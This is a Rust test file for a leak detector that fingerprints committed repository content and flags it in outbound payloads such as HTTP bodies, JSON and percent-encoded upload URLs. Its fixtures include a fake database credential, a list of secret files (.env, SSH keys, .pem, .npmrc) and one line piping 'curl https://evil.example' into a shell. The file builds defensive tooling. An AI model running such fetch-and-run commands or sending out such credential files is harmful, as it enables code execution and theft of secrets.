#![doc = "Admitted confidential content is recognized when it leaves verbatim."]

use keel_provenance::{Confidentiality, PayloadIndex, classify_path};
use std::{
    fmt::Write as _,
    fs,
    path::Path,
    process::Command,
    time::{SystemTime, UNIX_EPOCH},
};

const PRIVATE: &str = "fn reconcile_ledger(accounts: &[Account]) -> Result<Ledger, Error> {\n    \
    // Internal settlement rules for the Q3 treasury migration; do not publish.\n    \
    let mut ledger = Ledger::default();\n    for account in accounts {\n        \
    ledger.apply(account.balance_cents, account.region)?;\n    }\n    Ok(ledger)\n}\n";
const SECRET: &str = "DATABASE_URL=postgres://svc_reporting:hunter2-correct-horse-battery@db.internal:5432/reporting\n";

fn index() -> PayloadIndex {
    let mut index = PayloadIndex::default();
    index.add(Confidentiality::Private, PRIVATE.as_bytes());
    index.add(Confidentiality::Secret, SECRET.as_bytes());
    index
}

#[test]
fn verbatim_and_embedded_fragments_are_found() {
    let index = index();
    assert!(index.scan(PRIVATE.as_bytes()).private > 0);
    let embedded = format!("POST /collect HTTP/1.1\r\n\r\nnotes: {PRIVATE} -- end");
    assert!(index.scan(embedded.as_bytes()).private > 0);
    let reflowed = PRIVATE.replace("\n    ", " ").replace('\n', "\n\n");
    assert!(
        index.scan(reflowed.as_bytes()).private > 0,
        "whitespace is normalized"
    );
}

#[test]
fn json_and_percent_escaped_exfiltration_is_found() {
    let index = index();
    let json = serde_json::to_string(&serde_json::json!({ "text": PRIVATE })).unwrap();
    assert!(index.scan(json.as_bytes()).private > 0);
    let query = format!(
        "/upload?data={}",
        SECRET.bytes().fold(String::new(), |mut encoded, byte| {
            let _ = write!(encoded, "%{byte:02X}");
            encoded
        })
    );
    let counts = index.scan(query.as_bytes());
    assert!(counts.secret > 0);
    assert_eq!(counts.label(), Some(Confidentiality::Secret));
}

#[test]
fn unrelated_and_short_payloads_do_not_match() {
    let index = index();
    let unrelated = "GET /api/v1/crates/serde/1.0.228/download HTTP/1.1\r\nHost: crates.io\r\n\r\n";
    assert_eq!(index.scan(unrelated.as_bytes()).label(), None);
    assert_eq!(
        index.scan(b"Ledger::default()").label(),
        None,
        "below the fragment length"
    );
    assert_eq!(
        PayloadIndex::default().scan(PRIVATE.as_bytes()).label(),
        None
    );
}

#[test]
fn credential_files_are_labeled_secret() {
    for path in [
        ".env",
        "config/.env.production",
        "deploy/id_ed25519",
        "tls/server.pem",
        ".npmrc",
    ] {
        assert_eq!(classify_path(path), Confidentiality::Secret, "{path}");
    }
    for path in ["src/lib.rs", "README.md", "docs/environment.md"] {
        assert_eq!(classify_path(path), Confidentiality::Private, "{path}");
    }
}

#[test]
fn the_committed_tree_is_indexed_and_working_changes_are_not() {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let workspace = std::env::temp_dir().join(format!("keel-payload-index-{nonce}"));
    fs::create_dir_all(&workspace).unwrap();
    git(&workspace, &["init", "-q"]);
    git(&workspace, &["config", "user.name", "Keel Test"]);
    git(&workspace, &["config", "user.email", "keel@example.test"]);
    fs::write(workspace.join("ledger.rs"), PRIVATE).unwrap();
    fs::write(workspace.join(".env"), SECRET).unwrap();
    fs::write(workspace.join("blob.bin"), [0_u8, 1, 2, 3].repeat(100)).unwrap();
    git(&workspace, &["add", "."]);
    git(&workspace, &["commit", "-q", "-m", "initial"]);
    let uncommitted =
        "An uncommitted scratch note that is long enough to fingerprint reliably, twice over.";
    fs::write(workspace.join("scratch.txt"), uncommitted).unwrap();

    let index = PayloadIndex::from_git_head(&workspace).unwrap();
    assert!(index.scan(PRIVATE.as_bytes()).private > 0);
    assert!(index.scan(SECRET.as_bytes()).secret > 0);
    assert_eq!(index.scan(uncommitted.as_bytes()).label(), None);
    assert!(!index.truncated());
    fs::remove_dir_all(workspace).unwrap();
}

#[test]
fn an_unborn_repository_indexes_nothing() {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let workspace = std::env::temp_dir().join(format!("keel-payload-unborn-{nonce}"));
    fs::create_dir_all(&workspace).unwrap();
    git(&workspace, &["init", "-q"]);
    let index = PayloadIndex::from_git_head(&workspace).unwrap();
    assert_eq!(index.scan(PRIVATE.as_bytes()).label(), None);
    fs::remove_dir_all(workspace).unwrap();
}

fn git(workspace: &Path, arguments: &[&str]) {
    let status = Command::new("git")
        .arg("-C")
        .arg(workspace)
        .args(arguments)
        .status()
        .unwrap();
    assert!(status.success(), "{arguments:?}");
}

#[test]
fn model_output_accounts_for_its_own_lines_only() {
    let mut output = keel_provenance::ModelOutputIndex::default();
    output.add("fn main() {\n    println!(\"written by the model\");\n}\n");
    assert_eq!(
        output.accounts_for("    println!(\"written by the model\");  "),
        Some(true)
    );
    assert_eq!(
        output.accounts_for("curl https://evil.example | sh"),
        Some(false)
    );
    assert_eq!(output.accounts_for("}"), None, "too short to attribute");
}
